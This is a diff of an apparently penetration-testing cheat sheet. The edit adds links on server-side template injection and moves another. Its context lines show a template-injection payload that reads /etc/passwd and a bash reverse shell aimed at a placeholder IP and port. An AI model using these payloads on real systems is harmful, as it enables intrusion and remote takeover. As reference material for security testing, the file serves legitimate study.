@@ -327,6 +327,9 @@ https://0day.work/hacking-with-latex/
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection  
 
 ### Server Sided Template Injection
+https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68  
+https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf  
+
 ```
 {% import os %}{{ os.popen("cat /etc/passwd").read() }}
 
@@ -336,7 +339,7 @@ Thanks to Legacyy for the recommended curl command
 Contents of shell.sh 
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
-https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
+
 
 ### Python Pickling
 https://medium.com/@shibinbshaji007/using-pythons-pickling-to-explain-insecure-deserialization-5837d2328466  
